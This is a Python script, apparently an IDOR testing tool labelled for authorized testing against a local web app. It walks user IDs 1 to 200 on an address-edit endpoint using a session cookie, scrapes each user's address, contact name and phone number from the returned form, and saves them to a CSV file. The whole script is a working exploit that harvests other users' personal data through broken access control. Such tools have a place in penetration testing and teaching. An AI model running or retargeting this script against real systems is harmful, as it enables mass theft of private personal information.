#!/usr/bin/env python3
import requests
from bs4 import BeautifulSoup
import csv
import time

BASE = "http://127.0.0.1:5000"
ENDPOINT = "/account/address/edit?id={id}"
OUTFILE = "addresses.csv"
START_ID = 1
END_ID = 200
DELAY = 0.15

SESSION_COOKIE = "eyJ1c2VyX2lkIjoxLCJhbm90aGVyIjoi..."  # put your session cookie

headers = {
    "User-Agent": "IDOR-Miner/0.1 (authorized-testing)",
}
if SESSION_COOKIE:
    headers["Cookie"] = SESSION_COOKIE

session = requests.Session()
session.headers.update(headers)

def parse_address_html(html):
    soup = BeautifulSoup(html, "html.parser")
    text = soup.get_text(separator=" ", strip=True).lower()
    if "unauthorized" in text or "forbidden" in text or "access denied" in text:
        return None

    def val(name):
        el = soup.find(attrs={"name": name})
        return el.get("value", "").strip() if el else None

    row = {
        "id": None,
        "province": val("province"),
        "city": val("city"),
        "district": val("district"),
        "address": val("address"),
        "contact_name": val("contact_name"),
        "contact_phone": val("contact_phone"),
    }
    return row

def probe(user_id):
    url = BASE + ENDPOINT.format(id=user_id)
    try:
        r = session.get(url, timeout=8)
    except Exception as e:
        print(f"[{user_id}] connection error: {e}")
        return None, None

    if r.status_code == 404:
        print(f"[{user_id}] 404")
        return None, 404
    if r.status_code == 403:
        print(f"[{user_id}] 403 Forbidden")
        return None, 403
    if r.status_code >= 400:
        print(f"[{user_id}] HTTP {r.status_code}")
        return None, r.status_code

    row = parse_address_html(r.text)
    if row is None:
        print(f"[{user_id}] parse failed or unauthorized")
        return None, r.status_code
    row["id"] = user_id
    return row, r.status_code

def main():
    with open(OUTFILE, "w", newline="", encoding="utf-8") as f:
        fieldnames = ["id", "province", "city", "district", "address", "contact_name", "contact_phone"]
        writer = csv.DictWriter(f, fieldnames=fieldnames)
        writer.writeheader()

        for i in range(START_ID, END_ID + 1):
            row, status = probe(i)
            if row:
                writer.writerow(row)
                print(f"[{i}] saved -> {row}")
            time.sleep(DELAY)
    print("Done. Output:", OUTFILE)

if __name__ == "__main__":
    main()
